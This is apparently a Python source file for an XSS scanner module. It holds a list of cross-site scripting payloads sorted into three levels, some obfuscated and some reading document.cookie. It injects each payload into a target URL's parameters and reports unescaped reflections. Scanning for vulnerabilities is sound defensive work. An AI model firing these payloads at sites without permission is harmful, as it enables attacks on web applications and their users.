"""
XSS Detection Module
Cross-Site Scripting vulnerability detector
"""

import requests
from typing import List, Dict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import logging
from rich.console import Console
from rich.progress import Progress
from src.core.utils import save_json

console = Console()
logger = logging.getLogger(__name__)

class XSSDetector:
    """XSS vulnerability detection and testing"""
    
    # XSS payloads organized by level
    XSS_PAYLOADS = {
        1: [  # Basic
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>"
        ],
        2: [  # Moderate
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror=alert(1)>',
            '<details open ontoggle=alert(1)>'
        ],
        3: [  # Aggressive
            '<script>alert(document.cookie)</script>',
            '<script>alert(document.domain)</script>',
            '<script>alert(window.origin)</script>',
            '<img src=x onerror="alert(document.cookie)">',
            '<script>eval(atob("YWxlcnQoMSk="))</script>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            '<img src="javascript:alert(1)">',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            '<svg><script>alert(1)</script></svg>',
            '<math><mtext><script>alert(1)</script></mtext></math>',
            '<form action="javascript:alert(1)"><input type="submit">',
            '<isindex type=image src=1 onerror=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<<script>alert(1);//<</script>'
        ]
    }
    
    def __init__(self, url: str, method: str = 'GET', data: str = None):
        self.url = url
        self.method = method.upper()
        self.data = self._parse_data(data) if data else {}
        self.vulnerabilities: List[Dict] = []
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def _parse_data(self, data: str) -> Dict:
        """Parse POST data string"""
        if not data:
            return {}
        
        params = {}
        for pair in data.split('&'):
            if '=' in pair:
                key, value = pair.split('=', 1)
                params[key] = value
        
        return params
    
    def _get_parameters(self) -> Dict:
        """Extract parameters from URL or POST data"""
        if self.method == 'GET':
            parsed = urlparse(self.url)
            return parse_qs(parsed.query)
        else:
            return self.data
    
    def _test_payload(self, param: str, payload: str) -> bool:
        """Test a single XSS payload"""
        try:
            if self.method == 'GET':
                # Modify URL parameter
                parsed = urlparse(self.url)
                params = parse_qs(parsed.query)
                params[param] = [payload]
                
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                response = self.session.get(test_url, timeout=10)
            else:
                # Modify POST data
                test_data = self.data.copy()
                test_data[param] = payload
                
                response = self.session.post(self.url, data=test_data, timeout=10)
            
            # Check if payload is reflected in response
            if payload in response.text:
                # Check if it's in a script context or unescaped
                if not self._is_escaped(response.text, payload):
                    return True
            
            return False
        
        except Exception as e:
            logger.debug(f"Error testing payload: {e}")
            return False
    
    def _is_escaped(self, response: str, payload: str) -> bool:
        """Check if payload is properly escaped"""
        # Simple check for HTML entity encoding
        escaped_variants = [
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('"', '&quot;').replace("'", '&#x27;'),
            payload.replace('<', '&#60;').replace('>', '&#62;')
        ]
        
        for variant in escaped_variants:
            if variant in response:
                return True
        
        return False
    
    def test(self, level: int = 2) -> List[Dict]:
        """Test for XSS vulnerabilities"""
        console.print(f"[bold cyan]Testing XSS on: {self.url}[/bold cyan]")
        console.print(f"[yellow]Method: {self.method}, Level: {level}[/yellow]\n")
        
        parameters = self._get_parameters()
        
        if not parameters:
            console.print("[yellow]No parameters found to test[/yellow]")
            return []
        
        # Collect payloads based on level
        payloads = []
        for lvl in range(1, level + 1):
            if lvl in self.XSS_PAYLOADS:
                payloads.extend(self.XSS_PAYLOADS[lvl])
        
        console.print(f"[cyan]Testing {len(parameters)} parameters with {len(payloads)} payloads...[/cyan]\n")
        
        # Test each parameter
        with Progress(console=console) as progress:
            task = progress.add_task("[cyan]Testing...", total=len(parameters) * len(payloads))
            
            for param in parameters:
                console.print(f"[cyan]Testing parameter: {param}[/cyan]")
                
                for payload in payloads:
                    if self._test_payload(param, payload):
                        vuln = {
                            'type': 'XSS',
                            'severity': 'High',
                            'parameter': param,
                            'payload': payload,
                            'method': self.method,
                            'url': self.url,
                            'description': f'XSS vulnerability found in parameter "{param}"'
                        }
                        
                        self.vulnerabilities.append(vuln)
                        console.print(f"  [red]✗ VULNERABLE[/red] - Payload: {payload[:50]}...")
                        
                        # Don't test more payloads for this parameter
                        break
                    
                    progress.update(task, advance=1)
                
                if not any(v['parameter'] == param for v in self.vulnerabilities):
                    console.print(f"  [green]✓ Not vulnerable[/green]")
        
        return self.vulnerabilities
    
    def display_results(self, results: List[Dict]):
        """Display XSS test results"""
        if not results:
            console.print("\n[green]✓ No XSS vulnerabilities found![/green]")
            return
        
        console.print(f"\n[bold red]XSS Vulnerabilities Found: {len(results)}[/bold red]\n")
        
        for vuln in results:
            console.print(f"[red]Parameter:[/red] {vuln['parameter']}")
            console.print(f"[red]Method:[/red] {vuln['method']}")
            console.print(f"[red]Payload:[/red] {vuln['payload']}")
            console.print(f"[red]URL:[/red] {vuln['url']}")
            console.print("-" * 80)
    
    def save_results(self, results: List[Dict], filename: str):
        """Save results to file"""
        data = {
            'target': self.url,
            'method': self.method,
            'total_vulnerabilities': len(results),
            'vulnerabilities': results,
            'scan_date': str(__import__('datetime').datetime.now())
        }
        
        save_json(data, filename)
